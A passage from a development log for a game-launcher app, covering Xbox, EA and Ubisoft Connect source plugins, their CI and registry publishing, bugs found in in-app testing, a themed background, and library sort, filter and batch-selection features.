the Steam plugin's structure/conventions as a template (`Cargo.toml`'s `cargo-component`
metadata, `publish.yml` CI copied and adjusted for the new binary/repo names). `roxmltree`
(pure-Rust, no OS deps) parses `AppxManifest.xml` for the `Application` element and the
`ms-xbl-*` protocol check. `scan()` enumerates the Packages key, resolves `DisplayName`/
`PackageRootFolder`/derived family name per candidate, requests the read scope, and reads/
filters via the manifest check. `launch()` decodes the entry's `executable_path` (an
`xbox://<PackageFamilyName>!<AppId>` pseudo-URI, this plugin's own convention - parallels GOG's
`gog://<id>`) and calls `spawn-process("explorer.exe", ["shell:appsFolder\\..."])`. `plugin.json`
declares the `run-programs` capability (unlike Steam's dead-code `launch()`, this one genuinely
spawns a process) and a static `pathScopes` registry entry for the fixed `Packages` key prefix
(the per-package `PackageRootFolder` paths still need the dynamic `request-read-scope` call,
since those vary per install). Compiled clean via `cargo component build --release` on the
first attempt.

**`library.ts` gained an `xbox://` launch route**, mirroring the existing `gog://` branch
exactly (constructs a `GameEntry`-shaped object and invokes `wasm_plugin_launch` with
`pluginId: "xbox-wasm"`, rather than the generic URI/direct-process-spawn paths) - placed before
the generic `isUri` branch in the same `if`/`else if` chain, same reasoning as GOG (an
`xbox://` URI technically also matches the generic `includes("://")` check, so branch order,
not the URI check itself, is what routes it correctly). `bun run build` clean.

**Full pipeline run for real, start to finish**, same discipline as the VNDB plugin's earlier
verification: created the repo, pushed, set `REGISTRY_DISPATCH_TOKEN` (user ran the `gh secret
set` command themselves once given it), manually triggered `publish.yml` via
`workflow_dispatch` (push-triggered runs hadn't fired for a still-unexplained reason - possibly
Actions needing the very first push to already exist, unclear), watched it complete fully green
including the registry-notify step. As expected from the VNDB precedent,
`concourse-plugin-registry`'s auto-dispatch failed by design (`bump-entry.sh` refuses to add
new entries) - added the first `xbox-wasm` entry by hand exactly the same way: downloaded the
real published `v0.1.0` asset, computed its real SHA256
(`b099e6f2d5569dafa1109c981124345f6e163b1c34d5e8f8fd467c85f016cc12`) rather than trusting any
self-reported value, opened `concourse-plugin-registry#19`, confirmed the `Validate Registry`
check passed for real, merged.

**Real in-app verification, and a real bug caught by it.** User installed via the freeform Add
Plugin URL flow and hit a crash in `ConfirmInstall.vue` (`Cannot read properties of undefined
(reading 'length')`) before the install dialog could even render fully. Traced to
`plugin_installer.rs`'s `PluginPreview` struct: `#[derive(Serialize)]` with no `rename_all`, so
`path_scopes`/`http_scopes` serialized to the frontend as snake_case while `manifest.ts`/
`ConfirmInstall.vue` read `pathScopes`/`httpScopes` (camelCase) - a real, pre-existing bug, not
specific to this plugin (`WasmPluginManifest`, the *Deserialize*-side struct for reading a
plugin author's own manifest, already had per-field `rename = "..."` attributes; `PluginPreview`,
the outward-facing *Serialize*-side struct sent to the frontend, was never given the mirrored
treatment). It only ever surfaced for a plugin with a non-empty declared scope installed via the
freeform URL path specifically - most prior verification apparently went through the registry-
list install flow instead, which this bug's code path doesn't cover the same way. Fixed with a
single `#[serde(rename_all = "camelCase")]` on `PluginPreview`, `cargo check` clean, confirmed
fixed by the user after restarting `tauri dev` (a Rust-side change, not picked up by Vite's
hot-reload). Xbox plugin then verified fully end-to-end: installed, scanned, Minecraft for
Windows detected, launched successfully through the real running app - not just CI-clean this
time, actually GUI-tested. EA app and Ubisoft Connect plugins remain unstarted, now in the same
"research done, nothing built" position Xbox was in before this pass.

## Milestone 15 — EA Source Plugin: Built and Published

User bought Unravel ($5) via the EA app specifically to have a real title to verify against -
same discipline as Xbox/Minecraft. Findings ended up meaningfully different from, and simpler
than, the earlier community-sourced research predicted.

**The earlier `.mfst`/`ProgramData\Origin\LocalContent` research didn't hold up.** That
directory doesn't exist on this machine at all - EA app (formerly Origin) apparently moved its
local data layout since that research was written. Real structure found instead:
`C:\ProgramData\EA Desktop\InstallData\Unravel\` (just a checksum file, no useful manifest) and,
more usefully, Windows' own standard "Programs and Features" Uninstall registry entry
(`HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{GUID}`) - which for
Unravel directly gave `Publisher: "Electronic Arts, Inc."`, `InstallLocation`, and `DisplayIcon`
(the real exe path), no XML/manifest parsing needed at all for those.

**Direct exe launch works (tested for real - `Unravel.exe` spawned and opened cleanly, user
confirmed) but isn't the design that shipped.** Asked directly whether direct-launch is "better"
than the official `origin2://` route: no - it bypasses EA's own entitlement/DRM check, which
some titles (multiplayer-heavy, anti-cheat-gated, subscription titles) require and Unravel (an
old, simple, non-DRM-heavy indie title) happens not to. Since this plugin needs to keep working
across whatever EA games get bought later, not just Unravel, chose the officially-sanctioned
route once it was confirmed practical (see next paragraph) rather than the simpler-but-narrower
direct-exe path that only demonstrably works for this one title.

**Resolving `origin2://`'s `offerIds` turned out to be trivial, not the hard part the original
research implied.** `installerdata.xml` (found under Unravel's own `__Installer` folder) has a
`<contentIDs><contentID>1031469</contentID></contentIDs>` block - and that same `1031469` is
*also* directly the subkey name under `HKLM\SOFTWARE\WOW6432Node\Origin Games\1031469` (which
has a `DisplayName` value giving the title too) - so no XML parsing is needed at all; the
registry key alone gives contentID + title directly. Also confirmed `origin2://` is a genuinely
OS-registered protocol handler (`HKCR\origin2\shell\open\command` -> `EALauncher.exe "%1"`, not
a guess) - meaning this plugin can be Steam-shaped: a real URI, handled entirely by the host's
existing generic `openUrl()` launch branch, with no plugin-routed `launch()` dispatch needed the
way GOG's `gog://` or Xbox's `xbox://` pseudo-URIs require.

**User asked directly how many launch conventions exist across all source plugins now** -
answered with three: (1) real registered URI -> generic `openUrl()`, no plugin-specific
frontend code (Steam, Epic, now EA); (2) pseudo-URI -> routed through the plugin's own
`launch()` via `wasm_plugin_launch`, needing a dedicated `library.ts` branch (GOG, Xbox); (3)
direct executable spawn, the manually-added-game/pre-wrap fallback, not actually any external
source plugin's primary convention. EA landing in bucket (1) is why it needed zero new
`library.ts` code and no new host-side validator, unlike both GOG and Xbox.

**Built `ea-source-wasm-plugin`** (new repo, `smh0505/ea-source-wasm-plugin`) - the simplest of
the three real-world source plugins built this session: no XML/VDF parsing dependency at all
(pure registry reads), `pathScopes` declared statically in `plugin.json` (the `Origin Games` key
is a fixed prefix, no per-install-varying path the way Xbox's `PackageRootFolder` is, so no
dynamic `request-read-scope` call needed), and `launch()` is dead-code-for-completeness exactly
like Steam's (real URI, host bypasses calling it). Compiled clean via `cargo component build
--release` on the first attempt.

**Full pipeline run, with one real wrinkle: a genuine CI race.** Push-triggered builds fired
this time (unlike Xbox, where they mysteriously never did) - and since the registry secret was
set a couple minutes after the initial push, a manually `workflow_dispatch`-triggered run ended
up racing the push-triggered one. The push-triggered run published the release successfully but
failed its own `Notify concourse-plugin-registry` step (secret didn't exist yet at that moment);
the manual run's "already published?" check happened to run just before the push-triggered run's
own publish step completed, so it proceeded to (re-)publish the same tag and this time succeeded
on the registry-notify step too, since the secret existed by then. Verified the resulting release
asset set was clean (exactly one `.wasm` + one `plugin.json`, no duplicates) before trusting it.
As expected, `concourse-plugin-registry`'s auto-dispatch still failed by design (new entry, not
an existing one to bump) - added `ea-wasm` by hand the same way as VNDB/Xbox: downloaded the
real `v0.1.0` asset, computed its real SHA256
(`6a3a08faf805f131f9d352a06e083ae0925a23f0428757d72b943a707aa1638f`), opened
`concourse-plugin-registry#20`, confirmed `Validate Registry` passed, merged.

**Not yet done**: real in-app verification (install, scan, confirm Unravel detected and
launches through the running app) - same as Xbox's position before its own GUI test. Ubisoft
Connect remains completely unstarted.

## Milestone 15 — EA/Xbox: Two Real Bugs Caught by In-App Verification

Real in-app testing of the EA plugin surfaced two genuine bugs - one host-config gap, one
cross-plugin logic bug affecting Xbox too.

**Bug 1: `origin2:` wasn't allowlisted in Tauri's opener capability.** Launching Unravel failed
with "Not allowed to open url" - `src-tauri/capabilities/default.json`'s
`opener:allow-open-url` permission only listed `{ "url": "steam:*" }` and
`{ "url": "com.epicgames.launcher:*" }`, missing the new EA plugin's real launch protocol.
Fixed by adding `{ "url": "origin2:*" }` to the same list. A `tauri.conf.json`/capabilities
change, not picked up by Vite hot-reload - needed a full `tauri dev` restart to take effect.

**Bug 2: playtime wasn't recording for EA at all - and the same root cause affects Xbox too.**
User noticed Unravel's playtime wasn't updating after the launch-URL fix. Traced to
`library.ts`'s post-launch playtime hookup: `const installDir = game.install_dir ??
parentDir(game.executable_path);` - `parentDir()` returns `null` for any path containing
`"://"`, and neither plugin's `scan()` ever set `GameEntry.install_dir` in the first place, so
`installDir` resolved to `null` and `track_folder_playtime` was never even called. Silent, not
an error - the game would launch fine, playtime just never accumulated.

Compared against Steam's plugin, which does set a real `install_dir`
(`steamapps\common\<installdir>`) - that's why Steam's playtime tracking already worked and
this gap wasn't caught until a plugin without one shipped. Asked "investigate this for all
plugins" - checked every plugin's `to_game_entry` and confirmed only EA and Xbox had the gap
(Steam/GOG/Epic all set a real folder).

Fixed both, bumped both to `0.1.1`:
- **EA**: `Origin Games`'s own registry key never had an install path to begin with. Added a
  second registry read against Windows' standard Uninstall key
  (`HKLM\...\CurrentVersion\Uninstall`), filtered to `Publisher: "Electronic Arts, Inc."`,
  cross-referenced against `Origin Games`'s `DisplayName` by exact string match (the only link
  between the two - verified both said "Unravel™" identically for the same real install) to
  recover `InstallLocation`. Best-effort: a title that doesn't match just gets `install_dir:
  None`, degrading gracefully (scan/launch still work, only playtime tracking is affected) rather
  than failing the whole scan.
- **Xbox**: `PackageRootFolder` was already being read (needed for the `AppxManifest.xml`
  check) but never carried through to the `GameEntry` - simple oversight, fixed by adding it to
  the `XboxApp` struct and threading it into `to_game_entry`.

**Publish/registry pipeline run for both, with two new wrinkles.** Push-triggered CI actually
fired for both this time (unlike Xbox's first release, where it never did, for a reason still
unexplained) - and since both are version bumps to an *existing* registry entry rather than a
new one, `bump-entry.sh` auto-added the bump correctly for once (unlike every previous release
in this session, all of which were first-time entries requiring a hand-authored PR). But the
resulting auto-opened bump PRs hit the same `action_required` bot-PR-approval gate from the
VNDB saga - twice each, in fact, since a duplicate `repository_dispatch` (artifact of the
push-vs-manual-trigger race pattern from EA's first release) meant each PR's branch got a
second commit requiring its own separate approval. Approved each real run via `gh api .../
actions/runs/.../approve`, confirmed passing, then hit a bureaucratic wrinkle merging the EA PR
specifically: `gh pr merge` refused ("head branch is not up to date with base") because the
Xbox PR had merged to `main` moments earlier - resolved by manually merging `main` into the EA
bump branch locally and pushing, which re-triggered validation and let the merge go through.
Both registry entries verified pointing at their real `v0.1.1` releases/hashes afterward.

**User reported playtime still not updating after the 0.1.1 fix - turned out not to be a code
bug at all.** Queried the real SQLite DB directly rather than guessing: Minecraft's rows all had
an empty `install_dir` (imported under the pre-fix 0.1.0 plugin, never refreshed since), and
Unravel wasn't in the `games` table at all yet. Confirmed `importEntries`'s merge path
(`updateLaunchSource`) does refresh `install_dir` on an already-existing matched row - so the
actual fix wasn't more code, just re-running Scan Now so the already-imported games picked up
the corrected 0.1.1 data. A version bump alone never retroactively touches rows imported under
an older plugin version; only a rescan does. User rescanned, confirmed playtime tracking for
real afterward.

## Milestone 15 — Ubisoft Connect Source Plugin: Built and Published

User installed Ubisoft Connect + Brawlhalla specifically to verify against, same discipline as
Xbox/EA. This one confirmed the original community-sourced research almost exactly, and turned
out to be the simplest of the three plugins built this milestone.

**Verified against the real install first.** `HKLM\SOFTWARE\WOW6432Node\Ubisoft\Launcher\
Installs\16382\InstallDir` gave Brawlhalla's real path
(`C:/Program Files (x86)/Ubisoft/Ubisoft Game Launcher/games/Brawlhalla/` - forward slashes, not
an issue since the host's folder-tracking already normalizes both). More usefully, the standard
Windows Uninstall registry key `Uplay Install 16382` (still "Uplay" internally, pre-rebrand
naming) gives the *same* `InstallLocation` **plus** `DisplayName` ("Brawlhalla") **plus**
`Publisher: "Ubisoft"` all in one entry - unlike EA, where the equivalent id-bearing key and the
Uninstall key are two separate registrations only joinable by exact `DisplayName` text match.
Confirmed the pattern holds across both of the user's installed games (Brawlhalla and XDefiant).
`uplay://` confirmed as a real registered protocol (`HKCR\uplay\shell\open\command` ->
`UbisoftConnect.exe`) via the same check used for `origin2://`. Test-launched Brawlhalla for
real via `uplay://launch/16382/0` (`Start-Process`, then confirmed via `Get-Process` that
`Brawlhalla.exe` was actually running under the expected install path) before writing any code.

**Design ended up simpler than EA's.** Since one registry entry gives id + title + install path
together, `scan()` needs a single registry-tree walk (`list-registry-keys` on the Uninstall key,
filtered to entries whose subkey name starts with `"uplay install "` and whose `Publisher` is
`"Ubisoft"`) - no title-matching join step. `install_dir` was set correctly from the very first
version this time, having just fixed the same gap for EA/Xbox. The per-game
`uplay_install.manifest` file (binary, GZIP-compressed protobuf, undocumented schema, client
packed) is deliberately not touched at all - not realistically parseable, and unnecessary since
the registry alone gives everything needed.

**Built `ubisoft-source-wasm-plugin`** (new repo) - `launch()` is dead code exactly like
Steam/EA's, since `uplay://` is a real URI the host's generic `openUrl()` branch already
handles. Compiled clean on the first attempt. Full publish/registry pipeline run: same
push-vs-manual-dispatch race as EA's first release (secret wasn't set until a couple minutes
after the initial push), push-triggered run published but failed its own registry-notify step,
manual dispatch run succeeded fully including registry-notify. `concourse-plugin-registry`'s
auto-dispatch still failed by design (new entry) - added `ubisoft-wasm` by hand: downloaded the
real `v0.1.0` asset, computed its real SHA256
(`765fb4827c89f59b77c889ee3b8d4c6ac3c646c27931fedcf6dfed840e74910a`), opened
`concourse-plugin-registry#23`, confirmed `Validate Registry` passed, merged.

**Not yet done**: real in-app verification (install, scan, confirm Brawlhalla detected and
launches, playtime tracks) - same position Xbox/EA were in before their own GUI tests.

**Real in-app testing of the Ubisoft install caught another pre-existing i18n bug, latent since
whenever `registryScope` was first written.** Ubisoft's install-confirm dialog threw
`SyntaxError: Message compilation error: Unbalanced closing brace` under the Korean locale.
Root cause: `confirmInstall.registryScope`'s message template was `"{hive}\{prefix}"` in every
one of the 10 locale files - `\{` is vue-i18n's own escape sequence for a literal `{`, not a
plain backslash, so the template's real `{prefix}` interpolation got escaped away, leaving a
stray unmatched `}`. Not new to Ubisoft or to Korean specifically - every locale had the
identical broken template, and any plugin declaring a registry `pathScope` (Steam, Xbox, GOG all
qualify) would trigger the same compile error the first time its install-confirm dialog actually
rendered that scope row; it apparently just went unnoticed until now, and `bun run build` never
catches it since vue-i18n compiles message templates lazily at runtime; `vue-tsc` has no
visibility into ICU-style message syntax at all.

Initial fix space-padded the backslash (`"{hive} \ {prefix}"`) so it's never adjacent to a
brace - works, but changes the intended "HKLM\SOFTWARE\..." look. User asked why `\\` (JSON's
own escape for one literal backslash) didn't already dodge this, prompting a check of whether
vue-i18n's *own* `\\` escape (a second, independent layer on top of JSON's) could produce a
literal backslash that itself doesn't collide with brace-parsing. Verified directly against the
real `@intlify/message-compiler`/`vue-i18n` runtime (a standalone script, not just
build-passing, since this bug only manifests at lazy runtime compile) rather than guessing:
`"{hive}\\\\{prefix}"` in the JSON source -> `"{hive}\\{prefix}"` after JSON parsing -> vue-i18n's
own `\\` escape resolves to one real backslash, landing on the originally-intended format with
no extra spaces. Switched all 10 locales to this cleaner fix.

## Milestone 15 — XDefiant Phantom Entry: Registry-Only Detection Can Outlive a Real Install

User noticed XDefiant (a Ubisoft live-service game, publicly shut down) still showed up after
scanning Ubisoft Connect, and didn't think they even had it fully installed. Checked directly
rather than assuming: `D:/XDEFIANT/XDefiant/` (the exact `InstallLocation` the registry
reported) doesn't exist on disk at all - confirmed via `ls`. The registry entry
(`Uplay Install 15657`, the same one used for detection) had genuinely outlived the real
install folder, most likely left behind by the game's shutdown/removal process not fully
cleaning up its own Uninstall registry key.

This is a structural gap, not a one-off: every plugin in this milestone detects games purely by
reading registry state, and none of them had ever verified the install folder they found still
exists before including it in `scan()` results - `getInstallStatus` exists on the
`SourcePlugin` contract for exactly this kind of check, but nothing in the frontend actually
calls it anywhere (confirmed via a full grep - it's wired end-to-end, from WIT to `loader.ts`,
and simply never invoked). So the real fix has to happen inside each plugin's own `scan()`,
not bolted on afterward.

**Host-side**: added `"ea-wasm" | "ubisoft-wasm"` arms to `wasm_plugins.rs`'s
`do_request_read_scope` validator, both checking `Path::new(&path).is_dir()` - unlike Steam's
`steamapps` subdirectory or Xbox's `AppxManifest.xml` (real structural signatures), EA/Ubisoft
have no equivalent marker file, so "does this directory exist at all" doubles as both the
security check request-read-scope already exists for *and* the exact signal these two plugins
need to detect a stale entry.

**Ubisoft** (0.1.1): `scan()` now calls `request-read-scope` on `InstallLocation` before
including a game, `continue`-ing past it (skipping the entry entirely) on failure - matches
what a stale entry actually means here, since Ubisoft's single Uninstall-registry entry is the
*only* signal this plugin has for "installed," unlike EA below.

**EA** (0.1.2): same directory-exists check, but with one extra design decision - the `Origin
Games` registry key really represents *ownership* ("you bought this"), separate from
`InstallLocation`'s *installation* state (joined from a second registry key by title match, see
the earlier EA devlog entry). Considered keeping an owned-but-uninstalled title visible with no
`install_dir` (closer to what "owning" actually means), but rejected it for consistency:
every other source plugin in this app (Steam/GOG/Epic/Xbox/Ubisoft) scans *installed* games
only, never an owned-but-not-installed library. Matching that existing convention, EA now skips
a title entirely if no still-existing install folder is found for it - same behavior as
Ubisoft, for a different underlying reason.

Both plugins rebuilt clean, published (push-triggered CI fired correctly this time, no repeat
of Xbox's first-release mystery no-op), and bumped via `concourse-plugin-registry`'s real
auto-bump path this time (both are version bumps to *existing* entries, not first-time adds) -
hit the same `action_required` bot-PR-approval gate as every previous auto-bump PR this
session, approved both, and hit the by-now-familiar "PR branch behind base" wrinkle merging the
second one (Ubisoft's PR merged to `main` moments before EA's), resolved the same way as
before: merge `main` into the bump branch locally, push, re-validate, merge. Both registry
entries verified pointing at their real fixed versions afterward.

## Milestone 16 — ARC Raiders Theme + New `--content-background` Hook

User asked for a theme "based on ARC Raiders" with 4 diagonal stripes in red/yellow/green/blue
on the content background. Checked the real game's actual logo before building anything, same
discipline as everything else this session - two independent sources (a font-generator site
describing the real logo, a Steam Community discussion thread about what the stripe colors
mean) both said the real ARC Raiders stripes are **cyan, yellow, orange, and red**, not
red/yellow/green/blue. Surfaced this directly rather than silently building what was asked
for or silently substituting what was "correct" - asked the user to pick, they chose the real
palette. No official hex codes are published anywhere findable, so the actual hex values
(`#00d4ff` cyan, `#ffd400` yellow, `#ff9500` orange, `#ff3b30` red) are reasonable
representative picks, not sourced from an official palette.

**No existing hook could do this.** `.content` (App.vue) had no background of its own at all -
it just showed `body`'s flat `--color-base` through. Added a new opt-in CSS variable,
`--content-background`, defaulting to `transparent` (so every existing theme, none of which set
it, renders identically to before) - a theme can now set it to any real CSS `background` value,
gradient/pattern included, not just a color. `arc-raiders-theme`'s manifest sets it to a
`repeating-linear-gradient(135deg, ...)` layering all four real stripe colors at 10% opacity
over the dark base, diagonal per the request.

Published through the same pipeline every `data-theme-plugins` addition uses:
`bun run validate` locally, pushed, `Release Theme Plugins` CI validated and published the
`themes` release tag with the new manifest attached, `Notify concourse-plugin-registry`
dispatched but failed by design (`bump-entry.sh` doesn't auto-add new entries, same as every
other first-time plugin/theme this session) - added `arc-raiders-theme` to the registry by
hand: fetched the real commit-pinned manifest and the actual published release asset
separately, diffed them byte-for-byte to confirm they're identical before trusting either as
the hash source, opened `concourse-plugin-registry#26`, confirmed `Validate Registry` passed,
merged.

**Real-app testing caught two problems, both fixed.** First: `.sticky-header` (shared,
`styles.css`) and `GameFilters.vue`'s `.filters` both hardcoded `background: var(--color-base)`
- a flat solid patch that visibly broke the new pattern at their pinned edges. Both switched to
`var(--content-background, var(--color-base))`, same hook `.content` itself uses, falling back
identically for every theme that doesn't set it.

Second: the original `repeating-linear-gradient` tiles infinitely across the whole content
area - not what "4 exact diagonal stripes... with a gap between" actually asked for. Replaced
with a single non-repeating `linear-gradient` using hard color stops (4 solid bands with
transparent gaps between them, spanning the gradient line once), and added a genuine night-sky
base underneath - a handful of small `radial-gradient` "stars" at fixed positions plus a dark
navy-to-near-black `linear-gradient`, instead of the flat dark color it sat on before. Bumped
`1.0.0` -> `1.0.1` (value-only change, no new keys), republished, auto-bumped in the registry
this time (existing entry) - hit the same bot-PR-approval gate as every other auto-bump this
session, approved, merged.

**User feedback after seeing it live**: full-opacity bands spanning the whole content area
overpowered the UI and stopped reading as "ARC Raiders" at all - too loud, too much of the
page. Also wanted it concentrated in one corner (bottom-right) rather than running the full
diagonal. Reworked the stripe layer as its own separately-sized/positioned `background` layer
(`no-repeat bottom right / 55% 55%`, distinct from the star/base layers which still cover the
whole area) instead of one gradient spanning the full box, dropped stripe width from 10% to 4%
and opacity from solid to 40%. `1.0.1` -> `1.0.2`, same publish/registry-bump path as before.

**Third round of feedback**: gaps between stripes still too wide, stripes visibly ended within
the corner patch instead of reading as running off-frame, and no green-leaning color was
visible - asked directly whether to shift cyan or add a genuine 5th green stripe (departing
from the verified real 4-color palette); user chose neither exactly, specifying "change yellow
to teal and shift orange toward a yellowish lemon" instead. Implemented: yellow ->
`rgba(20,224,180,0.4)` (teal), orange -> `rgba(224,224,48,0.4)` (lemon-yellow), gaps narrowed
(~12% -> ~5%), and the stripe layer's `background-size` bumped `55%` -> `140%` (same
bottom-right position) so the pattern now bleeds past the content area's actual edges instead
of visibly terminating within the visible corner patch. `1.0.2` -> `1.0.3`.

## Milestone 25 — Library Functions Update: Batch Ops + Filter/Sort

Started the filter/sort workstream (batch ops still open). Sort options: `filteredGames`
(`library.ts`) gained a sort step applied after the existing filter step - `"title"` is left
un-re-sorted since `gameRepo.list()`'s own query is already `ORDER BY title COLLATE NOCASE`
(keeps the current default cheapest and behavior-identical for anyone who never touches sort),
`"mostPlayed"` sorts on `total_playtime` (already on `Game`), `"recentlyAdded"` sorts on `id`
descending (a proxy for insertion order - autoincrement, no separate created-at column, not
worth a migration just for this), `"recentlyPlayed"` needed real new data: `total_playtime` is
an aggregate on `Game` but "when was this last played" only exists in the `playtime_sessions`
log, and the only existing query for it (`PlaytimeRepository.getRecentlyPlayed`, built for
`StatsPanel.vue`'s widget) is `LIMIT`-based - top-N, not every game. Added
`getAllLastPlayed()` (same query, no `LIMIT`), fetched into a `Map<gameId, lastPlayed>` in
`refresh()` alongside `games` itself, looked up during sort rather than re-queried per
comparison. Never-played games sort after any played game regardless of direction.

Sort choice persists via `settingsRepo` (`sort_option` key), identical pattern to `viewMode`'s
existing `view_mode` key - loaded in `init()`, written in a new `setSortOption()` action.

UI: first pass was a collapsed-by-default panel with a native `<select>`; replaced per direct
feedback with the shared `DropdownMenu.vue` shell instead (same trigger+panel+backdrop-close
shape `GameDetail.vue`'s translate menu and `GamepadRemapSettings.vue`'s axis popup already
use) - `IconAdjustmentsHorizontal` trigger next to the view-mode toggle, opening a right-aligned
panel (`:deep(.sort-menu-panel) { left: auto; right: 0 }`, same override pattern the gamepad
axis popup uses) with one button per sort option, each a small icon-on-top/translated-label-
underneath square (`IconSortAscendingLetters`/`IconClock`/`IconChartBar`/`IconClockPlus`) laid
out in a horizontal row instead of a dropdown list. The milestone's own scope also calls for
playtime-range/install-status filters in this same menu eventually, deliberately deferred since
neither has a decided data shape yet (unlike sort, which had an obvious source in existing
`Game`/`playtime_sessions` fields). New `filters.toggleSortFilter`/`sortOptions.*` i18n keys
across all 10 locales (`sortLabel` added then removed in the same pass - the icon+select UI
never ended up needing a text label).

Batch operations (multi-select, batch tag/collection/remove actions, selection UI) remain
unstarted - a separable, larger workstream from filter/sort, left for a following pass.

**Batch operations.** New `stores/librarySelection.ts`: `active` (boolean, whether selection
mode is on) and `selectedIds` (`Set<number>`, always reassigned rather than mutated in place -
`.add()`/`.delete()` directly on the existing Set wouldn't trigger Vue reactivity for anything
keyed off the ref). A separate store from `library.ts` for the same reason tags/collections
already got their own stores - selection is interaction/UI-mode state, not library data.

`GameCard.vue`/`GameListRow.vue`: while `selection.active`, the whole card/row becomes a single
click-to-toggle target (`onCardClick`/`onRowClick`, gated on `selection.active` so normal
browsing is unaffected) and the play/edit/remove action footer is hidden entirely rather than
just visually deprioritized - an accidental single-game action mid-batch-session would be easy
to trigger if the buttons stayed reachable underneath. A small circular checkbox badge
(`.select-check`) is always visible (not hover-revealed) while selection mode is active, so
selection state is scannable across the whole grid/list at a glance. Confirmed via an Explore
pass first that neither component had an existing click-to-navigate handler on the card/row
body - nothing to conflict with.

Bulk store methods on `tags.ts`/`collections.ts` (`addToGames`/`removeFromGames`) and
`library.ts` (`deleteGames`) all follow the same shape: loop the raw repo call per game, then
call the store's own refresh function exactly once after the loop - looping the *existing*
single-item store action instead would have refreshed once per game, an O(n) waste for an O(1)-
refreshable operation.

`GameFilters.vue` UI: a selection-mode toggle button (`IconSquareCheck`, same
`.view-toggle-button` look as the view-mode/sort triggers) next to the view-mode toggle. While
active, a "N selected" bar appears with Select All (`selection.selectAll` over
`library.filteredGames`, so Select All respects whatever search/tag/collection filter is
currently applied) and Clear buttons, plus batch-action icon buttons: Add Tag and Add to
Collection (both `DropdownMenu`-based pickers listing `tags.allTags`/`collections.allCollections`,
right-aligned via the same `:deep(.batch-menu-panel) { left: auto; right: 0 }` override every
other custom dropdown in this file already uses), Remove from Library (`library.deleteGames`
then `selection.exit()`, no confirmation dialog - matches the existing single-game delete
button's lack of one), and an explicit exit button. All three action buttons disable when
nothing is selected.

Scoped this pass to *add*-only for tag/collection (not remove-specific-tag/remove-from-specific-
collection, despite the milestone text listing both directions) - a bulk "remove tag" picker
would need to be scoped to tags common to *all* selected games (a real design question: show the
union, or only the intersection?) rather than being a mechanical mirror of the add case. Left as
an explicit follow-up rather than guessing at that design call silently.

New `filters.toggleSelectionMode`/`selectionCount`/`selectAll`/`clearSelection`/`addTag`/
`addToCollection`/`noTagsYet`/`noCollectionsYet`/`removeFromLibrary`/`exitSelectionMode` i18n
keys across all 10 locales.

**Pill filters, second pass.** After the first `platform:steam`-token pass above shipped, this
grew through several rounds of direct feedback into a considerably more capable filter surface
than the milestone originally scoped - documented here as one connected design, not the order
each increment landed in, since the intermediate states aren't the interesting part.

*Search box as the single source of truth.* Tags/Collections already had pill rows
(`tags.activeFilter`/`collections.activeFilter`, exclusive single-select, set by clicking a
pill). Adding `tag:`/`collection:` tokens alongside `platform:` initially ran as a fully
separate AND-filter in `filteredGames`, independent of pill state - typing a token didn't
highlight anything, and pill clicks didn't touch the search box. Two follow-up requests
collapsed this into one mechanism: first, typed tokens started syncing into
`activeFilter`/`setFilter()` (a `watch(search, ...)` in `library.ts`, looking up the token's
canonical casing against `allTags`/`allCollections` since tokens are lowercased but stored names
aren't); then pill clicks were flipped to go the other direction too - `toggleFilter()` was
removed entirely, replaced by `library.setSearchToken(kind, value)`, which just adds/removes the
token text in `search`. The watcher is now the *only* writer of `activeFilter`, always mirroring
whatever's literally in the box. This was worth the churn: two independent code paths computing
"is this tag active" could disagree with each other (a token typed by hand vs. a pill clicked),
and merging them removed an entire class of possible bug rather than just the ones found so far.

*Multi-select.* `activeFilter: string | null` (exclusive - clicking a second tag pill replaced
the first) became `activeFilters: Set<string>` on `tags.ts`/`collections.ts`, with a parallel
`activePlatformFilters` computed directly on `library.ts` (platform still has no dedicated
store). `matches(gameId)` defaults to OR within a kind (any selected tag matches); different
kinds still always AND together, unchanged from the original single-select design.
`parseSearchTokens` had to change from last-write-wins (`platformFilter = value`) to collecting
every occurrence (`platformFilters.push(value)`), and `setSearchToken` changed from "replace the
kind's one token" to "toggle just this one value's token, leaving sibling tokens of the same
kind alone" - the difference between `tag:"X"` overwriting to `tag:"Y"` vs. both coexisting.

*OR/AND per kind.* A `matchMode: "or" | "and"` (new `PillMatchMode` type, defined once on
`tags.ts` and reused by `collections.ts`/`library.ts`) sits alongside each kind's
`activeFilters`, toggled via a small button next to that kind's heading in the browse-all-pills
modal (below). `matches()` branches `every()` vs. `some()` on it. Platform's "and" is honestly
close to useless - `Game.platform` is a single value, not an array, so 2+ selected platforms
under "and" can never match a real game - but it's offered anyway rather than making platform's
UI the one kind missing the toggle other two have.

*Overflow: capped row + modal, not per-row inline expansion.* The first attempt at handling
"what if there are 40 tags" was a per-row `usePillRow()` with its own `expanded` ref and a
"+N more"/"Show less" pill that expanded that one row in place. Replaced almost immediately by a
single `BaseModal` (reused, not a new modal component) listing every pill uncapped, grouped by
heading (Platforms/Tags/Collections) - clicking inside it calls the same `setSearchToken()` the
inline pills do, live, no save step, just a Close button. `usePillRow()` lost its `expanded`
state at that point (the row itself no longer expands, just opens the modal). Selected pills
were then made to sort to the front of the capped row (`usePillRow` gained an `isActive` check,
partitions active/inactive before slicing to `PILL_ROW_LIMIT`) so a pill toggled from the modal
doesn't vanish behind "+N more" the moment it's selected. Finally, the three separate per-kind
rows under the search bar were merged into one flat row (`allPillEntries`/`pillRow` -
`{kind, value}` tuples from all three sources combined before the cap is applied) - kind
grouping stays exclusively in the modal now, which is what it exists for; the row under the
search bar doesn't need to repeat that structure.

*Manual platform pill.* Manually-added games (`AddGame.vue` -> `gameRepo.add()`, which never
sets the `platform` column) had `platform === null` and were invisible to platform filtering
entirely - no pill, and no `platform:` token could ever match them. A `MANUAL_PLATFORM = "manual"`
sentinel gets added to `allPlatforms` whenever such a game exists, and `filteredGames` treats a
null platform as that sentinel for matching purposes, so "manual" behaves as a normal pill.

New `filters.showMore`/`browseFilters`/`platformsHeading`/`tagsHeading`/`collectionsHeading`/
`matchAny`/`matchAll`/`matchModeHint` i18n keys across all 10 locales (`showLess` added then
removed once per-row inline expansion was replaced by the modal).

## Milestone 26 — Quick-Launch Search

Before implementing, researched whether this pattern (global hotkey -> systemwide overlay ->
type to search/launch) actually has real precedent, since it changes the architecture
significantly. Confirmed: Playnite's "Keyboard Launcher" is exactly this - a system-wide
shortcut opening an overlay that works even when Playnite itself isn't focused, distinct from
its separate in-app "Global Search" (a VS-Code-style command palette, only reachable while
